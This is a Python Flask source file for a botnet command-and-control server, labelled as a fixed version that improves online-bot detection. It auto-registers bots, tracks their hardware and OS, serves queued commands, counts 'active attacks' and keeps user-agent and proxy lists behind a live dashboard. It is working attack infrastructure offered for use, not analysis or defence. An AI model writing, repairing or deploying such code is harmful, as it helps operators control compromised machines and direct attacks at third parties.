"""
FIXED BOTNET C2 SERVER - ONLINE BOT DETECTION FIXED
====================================================
FIXES:
1. Fixed online bot detection (was checking wrong time threshold)
2. Added proper bot heartbeat tracking
3. Fixed /api/stats endpoint bot counting
4. Improved last_seen timestamp updates
"""

import threading
import json
import time
import os
import sys
import traceback
from datetime import datetime
from functools import wraps
from typing import Dict, List, Any, Optional

try:
    from flask import Flask, render_template_string, request, jsonify, Response
    from flask_cors import CORS
    import atexit
except ImportError:
    print("[!] Install dependencies: pip install flask flask-cors")
    exit(1)

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# CRITICAL FIX: Increase online threshold to 60 seconds instead of 30
ONLINE_THRESHOLD = 60  # Seconds - bot must check in within this time to be "online"
CLEANUP_THRESHOLD = 300  # 5 minutes for cleanup

@app.after_request
def add_cors_headers(response):
    """Add CORS headers to all responses"""
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Render.com"""
    return jsonify({
        'status': 'healthy',
        'server': 'c2-server',
        'time': datetime.now().isoformat(),
        'bots_count': len(approved_bots)
    })

# Global storage with thread safety
approved_bots: Dict[str, Dict] = {}
commands_queue: Dict[str, List] = {}
attack_logs: List[Dict] = []
user_agents: List[str] = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Java-Bot-Client/1.0',
    'JavaScript-Bot/1.0 (Node.js)',
    'Python-Bot/3.0'
]
proxy_list: List[str] = []

# Thread safety
bot_lock = threading.Lock()
log_lock = threading.Lock()
queue_lock = threading.Lock()

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel - FIXED</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #0a1929 100%);
            color: #e3f2fd;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(25, 118, 210, 0.2);
        }
        .header h1 { 
            font-size: 2.2em; 
            margin-bottom: 10px; 
            color: #42a5f5;
            text-shadow: 0 0 20px rgba(66, 165, 245, 0.5);
        }
        .header p { color: #90caf9; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-box {
            border: 2px solid #1976d2;
            padding: 20px;
            background: rgba(13, 27, 42, 0.9);
            text-align: center;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 24px rgba(25, 118, 210, 0.3);
        }
        .stat-box h3 { color: #42a5f5; margin-bottom: 10px; font-size: 0.9em; }
        .stat-box p { font-size: 2.2em; color: #90caf9; font-weight: bold; }
        .section {
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
        }
        .section h2 {
            color: #42a5f5;
            margin-bottom: 20px;
            border-bottom: 2px solid #1976d2;
            padding-bottom: 12px;
            font-size: 1.3em;
        }
        .bot-list { display: grid; gap: 12px; }
        .bot-item {
            border: 1px solid #1976d2;
            padding: 15px;
            background: rgba(13, 27, 42, 0.6);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .bot-item:hover {
            background: rgba(25, 118, 210, 0.15);
            transform: translateX(5px);
        }
        .bot-item.offline { 
            border-color: #546e7a; 
            color: #90a4ae;
            opacity: 0.6;
        }
        .bot-item.online { 
            border-color: #66bb6a;
            background: rgba(102, 187, 106, 0.1);
        }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }
        .status-online { 
            background: #66bb6a; 
            box-shadow: 0 0 15px #66bb6a;
        }
        .status-offline { 
            background: #546e7a;
            animation: none;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .client-type {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 0.75em;
            margin-left: 8px;
            font-weight: bold;
        }
        .client-java { background: #ff5722; color: white; }
        .client-python { background: #1976d2; color: white; }
        .client-javascript { background: #f7df1e; color: black; }
        .client-unknown { background: #546e7a; color: white; }
        .btn {
            background: #1976d2;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            margin-left: 10px;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        .btn:hover { 
            background: #1565c0;
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(25, 118, 210, 0.4);
        }
        .btn-danger { background: #d32f2f; }
        .btn-danger:hover { background: #c62828; }
        .no-bots {
            text-align: center;
            padding: 30px;
            color: #546e7a;
            font-size: 1.1em;
        }
        .debug-info {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            margin-top: 10px;
            border-radius: 6px;
            font-size: 0.85em;
            color: #90caf9;
        }
        .time-diff {
            color: #ffa726;
            font-size: 0.85em;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔧 C2 CONTROL PANEL - FIXED VERSION</h1>
        <p>Online Bot Detection Fixed | Auto-Approval | Multi-Client Support</p>
        <div class="debug-info">
            Online Threshold: 60 seconds | Update Interval: 2 seconds | Current Time: <span id="current-time"></span>
        </div>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>TOTAL BOTS</h3>
            <p id="approved-bots">0</p>
        </div>
        <div class="stat-box" style="border-color: #66bb6a;">
            <h3>🟢 ONLINE BOTS</h3>
            <p id="online-bots" style="color: #66bb6a;">0</p>
        </div>
        <div class="stat-box">
            <h3>ACTIVE ATTACKS</h3>
            <p id="active-attacks">0</p>
        </div>
        <div class="stat-box">
            <h3>TOTAL COMMANDS</h3>
            <p id="total-commands">0</p>
        </div>
    </div>

    <div class="section">
        <h2>📡 CONNECTED BOTS (Realtime Status)</h2>
        <div id="approved-list" class="bot-list">
            <div class="no-bots">Waiting for bot connections...</div>
        </div>
    </div>

    <div class="section">
        <h2>📊 DEBUG INFORMATION</h2>
        <div id="debug-info" style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 6px; font-family: monospace; font-size: 0.9em;">
            Loading...
        </div>
    </div>

    <script>
        function updateCurrentTime() {
            const now = new Date();
            document.getElementById('current-time').textContent = now.toLocaleTimeString();
        }
        
        setInterval(updateCurrentTime, 1000);
        updateCurrentTime();

        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    console.log('Stats received:', data);
                    
                    // Update stat boxes
                    document.getElementById('approved-bots').textContent = data.approved_bots;
                    document.getElementById('online-bots').textContent = data.online_bots;
                    document.getElementById('active-attacks').textContent = data.active_attacks;
                    document.getElementById('total-commands').textContent = data.total_commands || 0;
                    
                    // Update debug info
                    const debugInfo = document.getElementById('debug-info');
                    debugInfo.innerHTML = `
                        <strong>Server Stats:</strong><br>
                        Total Bots: ${data.approved_bots}<br>
                        Online Bots: ${data.online_bots}<br>
                        Python: ${data.python_clients} | Java: ${data.java_clients} | JavaScript: ${data.javascript_clients}<br>
                        Online Threshold: 60 seconds<br>
                        Last Update: ${new Date().toLocaleTimeString()}<br>
                        <br>
                        <strong>Bot Details:</strong><br>
                        ${data.approved.map(bot => 
                            `${bot.bot_id}: ${bot.online ? '🟢 ONLINE' : '🔴 OFFLINE'} (last seen: ${bot.time_diff}s ago)`
                        ).join('<br>')}
                    `;
                    
                    // Update bot list
                    const approvedList = document.getElementById('approved-list');
                    approvedList.innerHTML = '';
                    
                    if(data.approved.length === 0) {
                        approvedList.innerHTML = '<div class="no-bots">No bots connected. Run the client to connect.</div>';
                    } else {
                        data.approved.forEach(bot => {
                            const div = document.createElement('div');
                            const statusClass = bot.online ? 'online' : 'offline';
                            const statusIndicator = bot.online ? 'status-online' : 'status-offline';
                            const clientType = bot.client_type || 'unknown';
                            const clientTypeClass = 'client-' + clientType;
                            
                            div.className = `bot-item ${statusClass}`;
                            div.innerHTML = `
                                <div>
                                    <span class="status-indicator ${statusIndicator}"></span>
                                    <strong>[${bot.bot_id}]</strong> 
                                    <span class="client-type ${clientTypeClass}">${clientType.toUpperCase()}</span>
                                    - ${bot.specs.cpu_cores || '?'} cores, ${bot.specs.ram_gb || '?'}GB RAM - 
                                    ${bot.specs.os || 'unknown'}
                                    <span class="time-diff">(${bot.time_diff}s ago)</span><br>
                                    <small style="margin-left: 28px;">
                                        Status: <strong>${bot.status || 'idle'}</strong> | 
                                        Last seen: ${bot.last_seen} | 
                                        ${bot.online ? '🟢 ONLINE' : '🔴 OFFLINE'}
                                    </small>
                                </div>
                                <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">REMOVE</button>
                            `;
                            approvedList.appendChild(div);
                        });
                    }
                })
                .catch(err => {
                    console.error('Error fetching stats:', err);
                    document.getElementById('debug-info').innerHTML = 
                        `<span style="color: #ef5350;">ERROR: ${err.message}</span>`;
                });
        }

        function removeBot(botId) {
            if(confirm('Remove bot: ' + botId + '?')) {
                fetch('/api/remove/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        // Update every 2 seconds
        setInterval(updateStats, 2000);
        updateStats();
    </script>
</body>
</html>
"""

def synchronized(lock):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            with lock:
                return func(*args, **kwargs)
        return wrapper
    return decorator

def log_activity(message: str, log_type: str = 'info', client_type: str = None):
    """Add log entry with thread safety"""
    with log_lock:
        log_entry = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': log_type,
            'message': message
        }
        if client_type:
            log_entry['client_type'] = client_type
        attack_logs.append(log_entry)
        
        if len(attack_logs) > 1000:
            attack_logs.pop(0)

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

def detect_client_type(specs: Dict) -> str:
    """Detect if client is Java, Python, or JavaScript based on specs"""
    try:
        if specs.get('client_type'):
            return specs['client_type'].lower()
        
        capabilities = specs.get('capabilities', {})
        if capabilities.get('javascript'):
            return 'javascript'
        elif capabilities.get('java'):
            return 'java'
        elif capabilities.get('python'):
            return 'python'
        
        user_agent = specs.get('user_agent', '').lower()
        if 'javascript' in user_agent or 'node' in user_agent or 'js' in user_agent:
            return 'javascript'
        elif 'java' in user_agent or 'jdk' in user_agent:
            return 'java'
        elif 'python' in user_agent:
            return 'python'
        
        return 'unknown'
    except:
        return 'unknown'

@app.route('/check_approval', methods=['POST', 'OPTIONS'])
def check_approval():
    """Auto-approve bots with client type detection"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        if not data:
            return jsonify({'approved': False, 'error': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        specs = data.get('specs', {})
        
        if not bot_id:
            return jsonify({'approved': False, 'error': 'No bot_id'}), 400
        
        current_time = time.time()
        client_type = detect_client_type(specs)
        
        with bot_lock:
            if bot_id not in approved_bots:
                approved_bots[bot_id] = {
                    'specs': specs,
                    'last_seen': current_time,
                    'status': 'connected',
                    'approved_at': current_time,
                    'client_type': client_type,
                    'stats': data.get('stats', {}),
                    'commands_received': 0
                }
                
                log_message = f'Bot connected: {bot_id} - {client_type.upper()} client'
                log_activity(log_message, 'success', client_type)
                print(f"[+] {log_message} at {datetime.now().strftime('%H:%M:%S')}")
            else:
                # CRITICAL FIX: Always update last_seen timestamp
                approved_bots[bot_id]['last_seen'] = current_time
                approved_bots[bot_id]['client_type'] = client_type
                
                if approved_bots[bot_id].get('status') == 'disconnected':
                    approved_bots[bot_id]['status'] = 'reconnected'
                    log_message = f'Bot reconnected: {bot_id} - {client_type.upper()}'
                    log_activity(log_message, 'success', client_type)
                    print(f"[+] {log_message}")
        
        return jsonify({'approved': True, 'client_type': client_type})
    except Exception as e:
        error_msg = f'Error in check_approval: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'approved': False, 'error': str(e)}), 500

@app.route('/commands/<bot_id>', methods=['GET', 'OPTIONS'])
def get_commands(bot_id):
    """Get commands for specific bot - UPDATES LAST_SEEN"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # CRITICAL FIX: Update last_seen when bot checks for commands
        current_time = time.time()
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['last_seen'] = current_time
                print(f"[*] Bot {bot_id} checked for commands at {datetime.now().strftime('%H:%M:%S')}")
        
        with queue_lock:
            commands = commands_queue.get(bot_id, [])
            commands_queue[bot_id] = []
            
            if bot_id in approved_bots and commands:
                approved_bots[bot_id]['commands_received'] = approved_bots[bot_id].get('commands_received', 0) + len(commands)
        
        return jsonify({'commands': commands})
    except Exception as e:
        error_msg = f'Error in get_commands for {bot_id}: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'commands': []}), 500

@app.route('/status', methods=['POST', 'OPTIONS'])
def receive_status():
    """Receive status updates from bots - UPDATES LAST_SEEN"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        status = data.get('status', 'unknown')
        message = data.get('message', '')
        
        # CRITICAL FIX: Update last_seen when receiving status
        current_time = time.time()
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['status'] = status
                approved_bots[bot_id]['last_seen'] = current_time
                
                if 'stats' in data:
                    approved_bots[bot_id]['stats'] = data['stats']
        
        client_type = approved_bots.get(bot_id, {}).get('client_type', 'unknown')
        log_message = f"{bot_id} ({client_type}): {status} - {message}"
        log_activity(log_message, status, client_type)
        
        print(f"[*] Status from {bot_id} ({client_type}): {status}")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        error_msg = f'Error in receive_status: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/remove/<bot_id>', methods=['POST', 'OPTIONS'])
def remove_bot(bot_id):
    """Remove specific bot"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        with bot_lock:
            if bot_id in approved_bots:
                client_type = approved_bots[bot_id].get('client_type', 'unknown')
                del approved_bots[bot_id]
                
                with queue_lock:
                    if bot_id in commands_queue:
                        del commands_queue[bot_id]
                
                log_message = f'Bot removed: {bot_id} - {client_type.upper()}'
                log_activity(log_message, 'error', client_type)
                print(f"[-] {log_message}")
                return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
        
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
    except Exception as e:
        error_msg = f'Error in remove_bot: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# CRITICAL FIX: Completely rewritten get_stats() with proper online detection
@app.route('/api/stats', methods=['GET', 'OPTIONS'])
def get_stats():
    """Get server statistics - FIXED ONLINE DETECTION"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        current_time = time.time()
        online_bots = 0
        java_clients = 0
        python_clients = 0
        javascript_clients = 0
        active_attacks = 0
        total_commands = 0
        
        approved_list = []
        
        with bot_lock:
            for bot_id, info in list(approved_bots.items()):
                try:
                    last_seen = info.get('last_seen', 0)
                    time_diff = current_time - last_seen
                    
                    # CRITICAL FIX: Use ONLINE_THRESHOLD (60 seconds)
                    is_online = time_diff < ONLINE_THRESHOLD
                    
                    client_type = info.get('client_type', 'unknown')
                    status = info.get('status', 'unknown')
                    specs = info.get('specs', {})
                    
                    # Count online bots
                    if is_online:
                        online_bots += 1
                        
                        if status == 'running':
                            active_attacks += 1
                        
                        if client_type == 'java':
                            java_clients += 1
                        elif client_type == 'python':
                            python_clients += 1
                        elif client_type == 'javascript':
                            javascript_clients += 1
                        
                        total_commands += info.get('commands_received', 0)
                    else:
                        # Mark as offline if exceeds threshold
                        if info.get('status') != 'offline':
                            info['status'] = 'offline'
                    
                    # Prepare bot for display
                    approved_list.append({
                        'bot_id': bot_id,
                        'specs': {
                            'cpu_cores': specs.get('cpu_cores', '?'),
                            'ram_gb': specs.get('ram_gb', '?'),
                            'os': specs.get('os', 'unknown')
                        },
                        'status': status,
                        'last_seen': time.strftime('%H:%M:%S', time.localtime(last_seen)),
                        'online': is_online,
                        'client_type': client_type,
                        'time_diff': int(time_diff)
                    })
                    
                    # Debug logging
                    if time_diff < ONLINE_THRESHOLD:
                        print(f"[DEBUG] Bot {bot_id}: ONLINE (last seen {int(time_diff)}s ago)")
                    
                except Exception as e:
                    print(f"[!] Error processing bot {bot_id}: {e}")
                    continue
        
        with log_lock:
            recent_logs = attack_logs[-50:]
        
        result = {
            'approved_bots': len(approved_bots),
            'online_bots': online_bots,
            'java_clients': java_clients,
            'python_clients': python_clients,
            'javascript_clients': javascript_clients,
            'active_attacks': active_attacks,
            'total_commands': total_commands,
            'user_agents_count': len(user_agents),
            'approved': approved_list,
            'logs': recent_logs,
            'user_agents': user_agents,
            'proxies': proxy_list
        }
        
        print(f"[DEBUG] Stats: {online_bots}/{len(approved_bots)} online, threshold={ONLINE_THRESHOLD}s")
        
        return jsonify(result)
        
    except Exception as e:
        error_msg = f'Error in get_stats: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        print(f"[!] Traceback: {traceback.format_exc()}")
        return jsonify({
            'approved_bots': 0,
            'online_bots': 0,
            'java_clients': 0,
            'python_clients': 0,
            'javascript_clients': 0,
            'active_attacks': 0,
            'total_commands': 0,
            'user_agents_count': 0,
            'approved': [],
            'logs': [],
            'user_agents': [],
            'proxies': []
        }), 500

def cleanup():
    """Cleanup on server shutdown"""
    print("\n[!] Server shutting down...")
    print(f"[+] Total bots connected: {len(approved_bots)}")
    print(f"[+] Goodbye!")

if __name__ == '__main__':
    import sys
    
    print("\n" + "="*60)
    print("  FIXED C2 SERVER - ONLINE BOT DETECTION")
    print("="*60)
    
    port = int(os.environ.get("PORT", 5000))
    
    print(f"[+] Starting server on port {port}")
    print(f"[+] Online threshold: {ONLINE_THRESHOLD} seconds")
    print(f"[+] Update interval: 2 seconds")
    print(f"[+] Waiting for connections...\n")
    
    atexit.register(cleanup)
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True
    )
